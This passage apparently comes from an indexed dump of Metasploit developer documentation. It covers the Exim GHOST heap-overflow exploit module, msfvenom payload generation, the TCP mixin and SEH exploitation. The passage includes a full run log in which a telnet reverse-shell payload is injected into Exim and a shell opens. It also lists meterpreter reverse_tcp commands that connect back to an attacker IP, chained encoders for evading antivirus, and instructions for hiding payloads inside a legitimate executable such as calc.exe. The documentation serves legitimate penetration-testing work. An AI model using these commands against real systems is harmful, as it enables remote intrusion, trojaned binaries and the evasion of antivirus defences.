leaked_arch: x86 [+] Successfully leaked_addr: b7fda760 [*] Trying code execution... [!] ${run{/usr/bin/env setsid /bin/sh -c \"sh -c '(sleep 4011|telnet 192.168.1.64 4444|while : ; do sh && break; done 2>&1|telnet 192.168.1.64 4444 >/dev/null 2>&1 &)'\"}} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fda760\", :offset=>21} [!] {:reply=>{:code=>\"250\", :lines=>[\"250 Accepted\\r\\n\"]}} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fda760\", :offset=>25} [!] {:reply=>{:code=>\"250\", :lines=>[\"250 Accepted\\r\\n\"]}} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd8fd7\", :offset=>20} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd8fd7\", :offset=>8} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd784e\", :offset=>6} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd784e\", :offset=>12} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd60c5\", :offset=>19} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd60c5\", :offset=>29} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd493c\", :offset=>23} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd493c\", :offset=>18} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd31b3\", :offset=>14} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd31b3\", :offset=>3} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd1a2a\", :offset=>29} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd1a2a\", :offset=>28} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd02a1\", :offset=>26} [!] {:reply=>{:code=>\"550\", :lines=>[\"550 sikVtqGxFOjCBOWTbDupmIuJRmLmShFNqqUYRRPUolyxPmmgLCenEzConuVGWafjgycyRfXulGNwmAOvkqZkGobMyUIMPojZsaziCjVVyvabOrcieEWrLZSgnCCXHeXjIzGGfUALAIubgBEmsKsSWSGa\\r\\n\"]}} [+] Brute-force SUCCESS [+] Please wait for reply... [*] Accepted the first client connection... [*] Accepted the second client connection... [*] Command: echo qaNpBmRBEus9XoVZ; [*] Writing to socket A [*] Writing to socket B [*] Reading from sockets... [*] Reading from socket A [*] A: \"qaNpBmRBEus9XoVZ\\r\\n\" [*] Matching... [*] B is input... [*] Command shell session 1 opened (192.168.1.64:4444 -> 192.168.1.166:58859) at 2015-03-19 03:36:52 -0500 [!] {:reply=>nil} id uid=104(Debian-exim) gid=112(Debian-exim) groups=112(Debian-exim) References: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0235 https://community.qualys.com/blogs/laws-of-vulnerabilities/2015/03/17/ghost-remote-code-execution-exploit https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.171218720.101498705.1426692159 https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.136230833.101498705.1426692159","title":"How to use exim gethostbyname bof.rb (Exim GHOST Buffer Overflow)"},{"location":"dev/dark/How-to-use-exim_gethostbyname_bof.rb-(Exim-GHOST-Buffer-Overflow)/#what-is-ghost","text":"This is a heap based buffer overflow found in GNU C Library's **g**et**host**byname functions since glibc-2.2 (November 10, 2000), which is part of the Linux operating system, such as: Debian, Red Hat, CentOS, and Ubuntu.","title":"What is \"GHOST\""},{"location":"dev/dark/How-to-use-exim_gethostbyname_bof.rb-(Exim-GHOST-Buffer-Overflow)/#exploitable-requirements","text":"On the server-side (victim): glibc-2.6 - glibc-2.17: The exploit depends on the newer versions' fd_nextsize (a member of the malloc_chunk structure) to remotely obtain the address of Exim's smtp_cmd_buffer in the heap. Exim server. The first exploitable version is Exim-4.77, maybe older. The exploit depends on the newer versions' 16-KB smtp_cmd_buffer to reliably set up the heap as described in the advisory. The Exim server also must enable helo_try_verify_hosts or helo_verify_hosts in the /etc/exim4/exim4.conf.template file. The \"verify = helo\" ACL might be exploitable too, but the attack vector isn't as reliable, therefore not supported by the module. For testing purposes, if you need to find a vulnerable system, you can try Debian 7 (it should come with an exploitable Exim server): http://ftp.cae.tntech.edu/debian-cd/dvd/debian-7.7.0-i386-DVD-1.iso On the attacker's side: The attacker's IPv4 address must have both forward and reverse DNS entries that match each other (Forward-Confirmed reverse DNS).","title":"Exploitable Requirements"},{"location":"dev/dark/How-to-use-exim_gethostbyname_bof.rb-(Exim-GHOST-Buffer-Overflow)/#the-check-method","text":"The GHOST exploit module comes with a check method. It is explicit, which means the check will actually try to trigger the vulnerability to determine if the host is vulnerable or not. The check is also enforced when you use the \"exploit\" or \"run\" command. However, you can turn off the enforcement by setting the FORCE_EXPLOIT datastore option to true. For example: set FORCE_EXPLOIT true run","title":"The check method"},{"location":"dev/dark/How-to-use-exim_gethostbyname_bof.rb-(Exim-GHOST-Buffer-Overflow)/#troubleshooting","text":"If the exim_gethostbyname_bof.rb module has failed on you: Failure Explanation bad SENDER_HOST_ADDRESS (nil) The SENDER_HOST_ADDRESS datastore option was not specified bad SENDER_HOST_ADDRESS (not in IPv4 dotted-decimal notation) The SENDER_HOST_ADDRESS datastore option was specified, but not in IPv4 dotted-decimal notation bad SENDER_HOST_ADDRESS (helo_verify_hosts) The SENDER_HOST_ADDRESS datastore option does not match the IPv4 address of the SMTP client (Metasploit), as seen by the SMTP server (Exim). bad SENDER_HOST_ADDRESS (no FCrDNS) the IPv4 address of the SMTP client (Metasploit) has no Forward-Confirmed reverse DNS. not vuln? old glibc? (no leaked_arch) the remote Exim server is either not vulnerable, or not exploitable (glibc versions older than glibc-2.6 have no fd_nextsize member in their malloc_chunk structure). NUL, CR, LF in addr? (no leaked_addr) Exim's heap address contains bad characters (NUL, CR, LF) and was therefore mangled during the information leak; this exploit is able to reconstruct most of these addresses, but not all (worst-case probability is ~1/85, but could be further improved). Brute-force SUCCESS\" followed by a nil reply, but no shell the remote Unix command was executed, but spawned a bind-shell or a reverse-shell that failed to connect (maybe because of a firewall, or a NAT, etc). Brute-force SUCCESS\" followed by a non-nil reply, and no shell The remote Unix command was executed, but failed to spawn the shell (maybe because the setsid command doesn't exist, or awk isn't gawk, or netcat doesn't support the -6 or -e option, or telnet doesn't support the -z option, etc).","title":"Troubleshooting"},{"location":"dev/dark/How-to-use-exim_gethostbyname_bof.rb-(Exim-GHOST-Buffer-Overflow)/#module-demonstration","text":"When everything is dialed in correctly, a successful attack should look like the following: msf exploit(exim_gethostbyname_bof) > run [*] Started reverse double handler [*] Trying information leak... [!] {:heap_shift=>736} [!] {:write_offset=>128, :error=>\"503 sender not yet given\"} [!] {:write_offset=>136, :error=>\"\\xE0.\\xFF\\xB7\\xE0.\\xFF\\xB7er not yet given\"} [!] {:error=>[\"\\xE0.\\xFF\\xB7\\xE0.\\xFF\\xB7er not yet given\", \"\", \"503 \\x89\\x10\", \"177\", \"177\\\\177\\\\177\", \"vJN\\\\177\\\\177\\\\177\\\\177\"]} [!] {:leaked_arch=>\"x86\"} [!] {:count=>{\"\\xE0.\\xFF\\xB7\\xE0.\\xFF\\xB7er not yet given\"=>8, \"hF\\xFE\\xB7hF\\xFE\\xB7er not yet given\"=>2}} [+] Successfully leaked_arch: x86 [+] Successfully leaked_addr: b7fda760 [*] Trying code execution... [!] ${run{/usr/bin/env setsid /bin/sh -c \"sh -c '(sleep 4011|telnet 192.168.1.64 4444|while : ; do sh && break; done 2>&1|telnet 192.168.1.64 4444 >/dev/null 2>&1 &)'\"}} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fda760\", :offset=>21} [!] {:reply=>{:code=>\"250\", :lines=>[\"250 Accepted\\r\\n\"]}} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fda760\", :offset=>25} [!] {:reply=>{:code=>\"250\", :lines=>[\"250 Accepted\\r\\n\"]}} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd8fd7\", :offset=>20} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd8fd7\", :offset=>8} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd784e\", :offset=>6} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd784e\", :offset=>12} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd60c5\", :offset=>19} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd60c5\", :offset=>29} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd493c\", :offset=>23} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd493c\", :offset=>18} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd31b3\", :offset=>14} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd31b3\", :offset=>3} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd1a2a\", :offset=>29} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd1a2a\", :offset=>28} [!] {:helo=>6144, :step=>6025, :addr=>\"b7fd02a1\", :offset=>26} [!] {:reply=>{:code=>\"550\", :lines=>[\"550 sikVtqGxFOjCBOWTbDupmIuJRmLmShFNqqUYRRPUolyxPmmgLCenEzConuVGWafjgycyRfXulGNwmAOvkqZkGobMyUIMPojZsaziCjVVyvabOrcieEWrLZSgnCCXHeXjIzGGfUALAIubgBEmsKsSWSGa\\r\\n\"]}} [+] Brute-force SUCCESS [+] Please wait for reply... [*] Accepted the first client connection... [*] Accepted the second client connection... [*] Command: echo qaNpBmRBEus9XoVZ; [*] Writing to socket A [*] Writing to socket B [*] Reading from sockets... [*] Reading from socket A [*] A: \"qaNpBmRBEus9XoVZ\\r\\n\" [*] Matching... [*] B is input... [*] Command shell session 1 opened (192.168.1.64:4444 -> 192.168.1.166:58859) at 2015-03-19 03:36:52 -0500 [!] {:reply=>nil} id uid=104(Debian-exim) gid=112(Debian-exim) groups=112(Debian-exim)","title":"Module Demonstration"},{"location":"dev/dark/How-to-use-exim_gethostbyname_bof.rb-(Exim-GHOST-Buffer-Overflow)/#references","text":"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0235 https://community.qualys.com/blogs/laws-of-vulnerabilities/2015/03/17/ghost-remote-code-execution-exploit https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.171218720.101498705.1426692159 https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.136230833.101498705.1426692159","title":"References:"},{"location":"dev/dark/How-to-use-msfvenom/","text":"Msfvenom is the combination of payload generation and encoding. It replaced msfpayload and msfencode on June 8 th 2015. To start using msfvenom, first please take a look at the options it supports: Options: -p, --payload <payload> Payload to use. Specify a '-' or stdin to use custom payloads --payload-options List the payload's standard options -l, --list [type] List a module type. Options are: payloads, encoders, nops, all -n, --nopsled <length> Prepend a nopsled of [length] size on to the payload -f, --format <format> Output format (use --help-formats for a list) --help-formats List available formats -e, --encoder <encoder> The encoder to use -a, --arch <arch> The architecture to use --platform <platform> The platform of the payload --help-platforms List available platforms -s, --space <length> The maximum size of the resulting payload --encoder-space <length> The maximum size of the encoded payload (defaults to the -s value) -b, --bad-chars <list> The list of characters to avoid example: '\\x00\\xff' -i, --iterations <count> The number of times to encode the payload -c, --add-code <path> Specify an additional win32 shellcode file to include -x, --template <path> Specify a custom executable file to use as a template -k, --keep Preserve the template behavior and inject the payload as a new thread -o, --out <path> Save the payload -v, --var-name <name> Specify a custom variable name to use for certain output formats --smallest Generate the smallest possible payload -h, --help Show this message How to generate a payload To generate a payload, there are two flags that you must supply (-p and -f): The -p flag: Specifies what payload to generate To see what payloads are available from Framework, you can do: ./msfvenom -l payloads The -p flag also supports \"-\" as a way to accept a custom payload: cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw The -f flag: Specifies the format of the payload Syntax example: ./msfvenom -p windows/meterpreter/bind_tcp -f exe To see what formats are supported, you can do the following to find out: ./msfvenom --help-formats Typically, this is probably how you will use msfvenom: $ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe How to encode a payload By default, the encoding feature will automatically kick in when you use the -b flag (the badchar flag). In other cases, you must use the -e flag like the following: ./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw To find out what encoders you can use, you can use the -l flag: ./msfvenom -l encoders You can also encode the payload multiple times using the -i flag. Sometimes more iterations may help avoiding antivirus, but know that encoding isn't really meant to be used a real AV evasion solution: ./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 How to avoid bad characters The -b flag is meant to be used to avoid certain characters in the payload. When this option is used, msfvenom will automatically find a suitable encoder to encode the payload: ./msfvenom -p windows/meterpreter/bind_tcp -b '\\x00' -f raw How to supply a custom template By default, msfvenom uses templates from the msf/data/templates directory. If you'd like to choose your own, you can use the -x flag like the following: ./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe Please note: If you'd like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only: ./msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe The -x flag is often paired with the -k flag, which allows you to run your payload as a new thread from the template. However, this currently is only reliable for older Windows machines such as x86 Windows XP. How to chain msfvenom output The old msfpayload and msfencode utilities were often chained together in order layer on multiple encodings. This is possible using msfvenom as well: ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \\ ./msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | \\ ./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe","title":"How to use msfvenom"},{"location":"dev/dark/How-to-use-msfvenom/#how-to-generate-a-payload","text":"To generate a payload, there are two flags that you must supply (-p and -f): The -p flag: Specifies what payload to generate To see what payloads are available from Framework, you can do: ./msfvenom -l payloads The -p flag also supports \"-\" as a way to accept a custom payload: cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw The -f flag: Specifies the format of the payload Syntax example: ./msfvenom -p windows/meterpreter/bind_tcp -f exe To see what formats are supported, you can do the following to find out: ./msfvenom --help-formats Typically, this is probably how you will use msfvenom: $ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe","title":"How to generate a payload"},{"location":"dev/dark/How-to-use-msfvenom/#how-to-encode-a-payload","text":"By default, the encoding feature will automatically kick in when you use the -b flag (the badchar flag). In other cases, you must use the -e flag like the following: ./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw To find out what encoders you can use, you can use the -l flag: ./msfvenom -l encoders You can also encode the payload multiple times using the -i flag. Sometimes more iterations may help avoiding antivirus, but know that encoding isn't really meant to be used a real AV evasion solution: ./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3","title":"How to encode a payload"},{"location":"dev/dark/How-to-use-msfvenom/#how-to-avoid-bad-characters","text":"The -b flag is meant to be used to avoid certain characters in the payload. When this option is used, msfvenom will automatically find a suitable encoder to encode the payload: ./msfvenom -p windows/meterpreter/bind_tcp -b '\\x00' -f raw","title":"How to avoid bad characters"},{"location":"dev/dark/How-to-use-msfvenom/#how-to-supply-a-custom-template","text":"By default, msfvenom uses templates from the msf/data/templates directory. If you'd like to choose your own, you can use the -x flag like the following: ./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe Please note: If you'd like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only: ./msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe The -x flag is often paired with the -k flag, which allows you to run your payload as a new thread from the template. However, this currently is only reliable for older Windows machines such as x86 Windows XP.","title":"How to supply a custom template"},{"location":"dev/dark/How-to-use-msfvenom/#how-to-chain-msfvenom-output","text":"The old msfpayload and msfencode utilities were often chained together in order layer on multiple encodings. This is possible using msfvenom as well: ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \\ ./msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | \\ ./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe","title":"How to chain msfvenom output"},{"location":"dev/dark/How-to-use-the-Msf-Exploit-Remote-Tcp-mixin/","text":"How to use the Msf::Exploit::Remote::Tcp mixin In Metasploit Framework, TCP sockets are implemented as Rex::Socket::Tcp, which extends the built-in Ruby Socket base class. You should always use the Rex socket instead of the native Ruby one because if not, your sockets are not manageable by the framework itself, and of course some features will be missing such as pivoting. The Developer's Guide in Metasploit's documentation directory explains how this works pretty well. For module development, normally you wouldn't be using Rex directly, so instead you'd be using the Msf::Exploit::Remote::Tcp mixin. The mixin already provides some useful features you don't really have to worry about during development, such as TCP evasions, proxies, SSL, etc. All you have to do is make that connection, send something, receive something, and you're done. Sounds pretty easy, right? Using the mixin To use the mixin, simply add the following statement within your module's class Metasploit3 (or class Metasploit4 ) scope: include Msf :: Exploit :: Remote :: Tcp When the mixin is included, notice there will be the following datastore options registered under your module: SSL - Negotiate SSL for outgoing connections. SSLVersion - The SSL version used: SSL2, SSL3, TLS1. Default is TLS1. SSLVerifyMode - Verification mode: CLIENT_ONCE, FAIL_IF_NO_PEER_CERT, NONE, PEER. Default is PEER. Proxies - Allows your module to support proxies. ConnectTimeout - Default is 10 seconds. TCP::max_send_size - Evasive option. Maxiumum TCP segment size. TCP::send_delay - Evasive option. Delays inserted before every send. If you wish to learn how to change the default value of a datastore option, please read \" Changing the default value for a datastore option \" Make a connection To make a connection, simply do the following: connect When you do this, what happens is that the connect method will call Rex::Socket::Tcp.create to create the socket, and register it to framework. It automatically checks with the RHOST/RPORT datastore options (so it knows where to connect to), but you can also manually change this: # This connects to metasploit.com connect ( true , { 'RHOST' => '208.118.237.137' , 'RPORT' => 80 }) The connect method will then return the Socket object, which is also accessible globally. But you see, there's a little more to it. The connect method can also raise some Rex exceptions that you might want to catch, including: Rex::AddressInUse - Possible when it actually binds to the same IP/port. ::Errno::ETIMEDOUT - When Timeout.timeout() waits to long to connect. Rex::HostUnreachable - Pretty self-explanatory. Rex::ConnectionTimeout - Pretty self-explanatory. Rex::ConnectionRefused - Pretty self-explanatory. So to sum it up, ideally when you use the connect method, you should rescue these: rescue Rex :: AddressInUse , :: Errno :: ETIMEDOUT , Rex :: HostUnreachable , Rex :: ConnectionTimeout , Rex :: ConnectionRefused If you are curious where all these exceptions are raised, you can find them in lib/rex/socket/comm/local.rb . Sending data There are several ways to send data with the Tcp mixin. To make things easier and safer, we recommend just use the put method: sock . put \"Hello, World!\" The reason the put method is safer is because it does not allow the routine to hang forever. By default, it doesn't wait, but if you want to make this more flexible, you can do this: begin sock . put ( \"data\" , { 'Timeout' => 5 }) rescue :: Timeout :: Error # You can decide what to do if the writing times out end Receiving data Now, let's talk about how to receive data. Mainly there are three methods you can use: get_once , get , and timed_read . The difference is that get_once will only try to poll the stream to see if there's any read data available one time , but the get method will keep reading until there is no more. As for timed_read , it's basically the read method wrapped around with a Timeout. The following demonstrates how get_once is used: begin buf = sock . get_once rescue :: EOFError end Note that get_once may also return nil if there is no data read, or it hits a EOFError if it receives nil as data. So please make sure you're catching nil in your module. The data reading methods can be found in lib/rex/io/stream.rb . Disconnecting To disconnect the connection, simply do: disconnect It is VERY important you disconnect in an ensure block, obviously to make sure you always disconnect if something goes wrong. If you don't do this, you may end up with a module that can only one request to the server (that very first one), and the rest are broken. Full example The following example should demonstrate how you would typically want to use the Tcp mixin: # Sends data to the remote machine # # @param data [String] The data to send # @return [String] The received data def send_recv_once ( data ) buf = '' begin connect sock . put ( data ) buf = sock . get_once || '' rescue Rex :: AddressInUse , :: Errno :: ETIMEDOUT , Rex :: HostUnreachable , Rex :: ConnectionTimeout , Rex :: ConnectionRefused , :: Timeout :: Error , :: EOFError => e elog ( \" #{ e . class } #{ e . message } \\n #{ e . backtrace * \" \\n \" } \" ) ensure disconnect end buf end","title":"How to use the Msf::Exploit::Remote::Tcp mixin"},{"location":"dev/dark/How-to-use-the-Msf-Exploit-Remote-Tcp-mixin/#how-to-use-the-msfexploitremotetcp-mixin","text":"In Metasploit Framework, TCP sockets are implemented as Rex::Socket::Tcp, which extends the built-in Ruby Socket base class. You should always use the Rex socket instead of the native Ruby one because if not, your sockets are not manageable by the framework itself, and of course some features will be missing such as pivoting. The Developer's Guide in Metasploit's documentation directory explains how this works pretty well. For module development, normally you wouldn't be using Rex directly, so instead you'd be using the Msf::Exploit::Remote::Tcp mixin. The mixin already provides some useful features you don't really have to worry about during development, such as TCP evasions, proxies, SSL, etc. All you have to do is make that connection, send something, receive something, and you're done. Sounds pretty easy, right?","title":"How to use the Msf::Exploit::Remote::Tcp mixin"},{"location":"dev/dark/How-to-use-the-Msf-Exploit-Remote-Tcp-mixin/#using-the-mixin","text":"To use the mixin, simply add the following statement within your module's class Metasploit3 (or class Metasploit4 ) scope: include Msf :: Exploit :: Remote :: Tcp When the mixin is included, notice there will be the following datastore options registered under your module: SSL - Negotiate SSL for outgoing connections. SSLVersion - The SSL version used: SSL2, SSL3, TLS1. Default is TLS1. SSLVerifyMode - Verification mode: CLIENT_ONCE, FAIL_IF_NO_PEER_CERT, NONE, PEER. Default is PEER. Proxies - Allows your module to support proxies. ConnectTimeout - Default is 10 seconds. TCP::max_send_size - Evasive option. Maxiumum TCP segment size. TCP::send_delay - Evasive option. Delays inserted before every send. If you wish to learn how to change the default value of a datastore option, please read \" Changing the default value for a datastore option \"","title":"Using the mixin"},{"location":"dev/dark/How-to-use-the-Msf-Exploit-Remote-Tcp-mixin/#make-a-connection","text":"To make a connection, simply do the following: connect When you do this, what happens is that the connect method will call Rex::Socket::Tcp.create to create the socket, and register it to framework. It automatically checks with the RHOST/RPORT datastore options (so it knows where to connect to), but you can also manually change this: # This connects to metasploit.com connect ( true , { 'RHOST' => '208.118.237.137' , 'RPORT' => 80 }) The connect method will then return the Socket object, which is also accessible globally. But you see, there's a little more to it. The connect method can also raise some Rex exceptions that you might want to catch, including: Rex::AddressInUse - Possible when it actually binds to the same IP/port. ::Errno::ETIMEDOUT - When Timeout.timeout() waits to long to connect. Rex::HostUnreachable - Pretty self-explanatory. Rex::ConnectionTimeout - Pretty self-explanatory. Rex::ConnectionRefused - Pretty self-explanatory. So to sum it up, ideally when you use the connect method, you should rescue these: rescue Rex :: AddressInUse , :: Errno :: ETIMEDOUT , Rex :: HostUnreachable , Rex :: ConnectionTimeout , Rex :: ConnectionRefused If you are curious where all these exceptions are raised, you can find them in lib/rex/socket/comm/local.rb .","title":"Make a connection"},{"location":"dev/dark/How-to-use-the-Msf-Exploit-Remote-Tcp-mixin/#sending-data","text":"There are several ways to send data with the Tcp mixin. To make things easier and safer, we recommend just use the put method: sock . put \"Hello, World!\" The reason the put method is safer is because it does not allow the routine to hang forever. By default, it doesn't wait, but if you want to make this more flexible, you can do this: begin sock . put ( \"data\" , { 'Timeout' => 5 }) rescue :: Timeout :: Error # You can decide what to do if the writing times out end","title":"Sending data"},{"location":"dev/dark/How-to-use-the-Msf-Exploit-Remote-Tcp-mixin/#receiving-data","text":"Now, let's talk about how to receive data. Mainly there are three methods you can use: get_once , get , and timed_read . The difference is that get_once will only try to poll the stream to see if there's any read data available one time , but the get method will keep reading until there is no more. As for timed_read , it's basically the read method wrapped around with a Timeout. The following demonstrates how get_once is used: begin buf = sock . get_once rescue :: EOFError end Note that get_once may also return nil if there is no data read, or it hits a EOFError if it receives nil as data. So please make sure you're catching nil in your module. The data reading methods can be found in lib/rex/io/stream.rb .","title":"Receiving data"},{"location":"dev/dark/How-to-use-the-Msf-Exploit-Remote-Tcp-mixin/#disconnecting","text":"To disconnect the connection, simply do: disconnect It is VERY important you disconnect in an ensure block, obviously to make sure you always disconnect if something goes wrong. If you don't do this, you may end up with a module that can only one request to the server (that very first one), and the rest are broken.","title":"Disconnecting"},{"location":"dev/dark/How-to-use-the-Msf-Exploit-Remote-Tcp-mixin/#full-example","text":"The following example should demonstrate how you would typically want to use the Tcp mixin: # Sends data to the remote machine # # @param data [String] The data to send # @return [String] The received data def send_recv_once ( data ) buf = '' begin connect sock . put ( data ) buf = sock . get_once || '' rescue Rex :: AddressInUse , :: Errno :: ETIMEDOUT , Rex :: HostUnreachable , Rex :: ConnectionTimeout , Rex :: ConnectionRefused , :: Timeout :: Error , :: EOFError => e elog ( \" #{ e . class } #{ e . message } \\n #{ e . backtrace * \" \\n \" } \" ) ensure disconnect end buf end","title":"Full example"},{"location":"dev/dark/How-to-use-the-Seh-mixin-to-exploit-an-exception-handler/","text":"Exception handler overwriting was once a very popular technique to exploit stack buffer overflows, but isn't so common anymore in newer programs because most likely they're compiled with SafeSEH. At one point, even with SafeSEH enabled, it was still possible to abuse an exception handler by heap spraying, but of course, memory protections didn't stop there. DEP/FASLR eventually came to the rescue, so that pretty much ended the glory days of SEH exploits. You can probably still find vulnerable applications not compiled with SafeSEH, but chances are the app is outdated, no longer maintained, or it is more of a learning experiment for the developer. Oh, and there's probably an exploit for that already. Nonetheless, exploiting a stack buffer overflow with exception handling is still fun, so if you do come across it, here's how it's supposed to be written with Metasploit's Seh mixin. Requirements To be able to use the SEH mixin, some exploitable requirements must be met: The vulnerable program does not have SafeSEH in place. No DEP (Data Execution Prevention). The mixin uses a short jump to be able to execute the payload, which means the memory must be executable. DEP, as the name implies, prevents that. Usage First, make sure you include the Seh mixin under the scope of your module's Metasploit3 class: include Msf :: Exploit :: Seh Next, you need to set up a Ret address for the SE handler. This address should be placed in your module's metadata, specifically under Targets . In Metasploit, each target is actually an array of two elements. The first element is just the name of the target (and there is currently no strict naming style), the second element is actually a hash that contains information specific to that target, such as the target address. Here's an example of setting up a Ret address: 'Targets' => [ [ 'Windows XP' , { 'Ret' => 0x75022ac4 } ] # p/p/r in ws2help.dll ] As you can see, it's also a good habit to document what the Ret address does, and which DLL it points to. Ret is actually kind of a special key, because it can be retrieved by using target.ret in the module. In our next examples, you will see target.ret being used instead of coding the target address raw. If you need a tool to find a POP/POP/RET for the Ret address, you can use Metasploit's msfbinscan utility, which is located under the tools directory. OK now, let's move on to the methods. There are two methods provided by the Seh mixin: generate_seh_payload - Generates a fake SEH record with the payload attached right after. Here's an example: buffer = '' buffer << \"A\" * 1024 # 1024 bytes of padding buffer << generate_seh_payload ( target . ret ) # SE record overwritten after 1024 bytes The actual layout of buffer should look like this in memory: [ 1024 bytes of 'A' ][ A short jump ][ target.ret ][ Payload ] generate_seh_record - Generates a fake SEH record without the payload, in case you prefer to place the payload somewhere else. Code example: buffer = '' buffer << \"A\" * 1024 # 1024 bytes of padding buffer << generate_seh_payload ( target . ret ) buffer << \"B\" * 1024 # More padding The memory layout should like this: [ 1024 bytes of 'A' ][ A short jump ][ target.ret ][ Padding ] References https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/ https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/seh.rb https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/seh.rb","title":"How to use the Seh mixin to exploit an exception handler"},{"location":"dev/dark/How-to-use-the-Seh-mixin-to-exploit-an-exception-handler/#requirements","text":"To be able to use the SEH mixin, some exploitable requirements must be met: The vulnerable program does not have SafeSEH in place. No DEP (Data Execution Prevention). The mixin uses a short jump to be able to execute the payload, which means the memory must be executable. DEP, as the name implies, prevents that.","title":"Requirements"},{"location":"dev/dark/How-to-use-the-Seh-mixin-to-exploit-an-exception-handler/#usage","text":"First, make sure you include the Seh mixin under the scope of your module's Metasploit3 class: include Msf :: Exploit :: Seh Next, you need to set up a Ret address for the SE handler. This address should be placed in your module's metadata, specifically under Targets . In Metasploit, each target is actually an array of two elements. The first element is just the name of the target (and there is currently no strict naming style), the second element is actually a hash that contains information specific to that target, such as the target address. Here's an example of setting up a Ret address: 'Targets' => [ [ 'Windows XP' , { 'Ret' => 0x75022ac4 } ] # p/p/r in ws2help.dll ] As you can see, it's also a good habit to document what the Ret address does, and which DLL it points to. Ret is actually kind of a special key, because it can be retrieved by using target.ret in the module. In our next examples, you will see target.ret being used instead of coding the target address raw. If you need a tool to find a POP/POP/RET for the Ret address, you can use Metasploit's msfbinscan utility, which is located under the tools directory. OK now, let's move on to the methods. There are two methods provided by the Seh mixin: generate_seh_payload - Generates a fake SEH record with the payload attached right after. Here's an example: buffer = '' buffer << \"A\" * 1024 # 1024 bytes of padding buffer << generate_seh_payload ( target . ret ) # SE record overwritten after 1024 bytes The actual layout of buffer should look like this in memory: [ 1024 bytes of 'A' ][ A short jump ][ target.ret ][ Payload ] generate_seh_record - Generates a fake SEH record without the payload, in case you prefer to place the payload somewhere else. Code example: buffer = '' buffer << \"A\" * 1024 # 1024 bytes of padding buffer << generate_seh_payload ( target . ret ) buffer << \"B\" * 1024 # More padding The memory layout should like this: [ 1024 bytes of 'A' ][ A short jump ][ target.ret ][ Padding ]","title":"Usage"},{"location":"dev/dark/How-to-use-the-Seh-mixin-to-exploit-an-exception-handler/#references","text":"https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/ https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/seh.rb https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/seh.rb","title":"References"},{"location":"dev/dark/How-to-write-a-HTTP-LoginScanner-Module/","text":"This is a step-by-step guide on how to write a HTTP login module using the latest LoginScanner and Credential APIs. Before we begin, it's probably a good idea to read Creating Metasploit Framework LoginScanners , which explains about the APIs in-depth. The 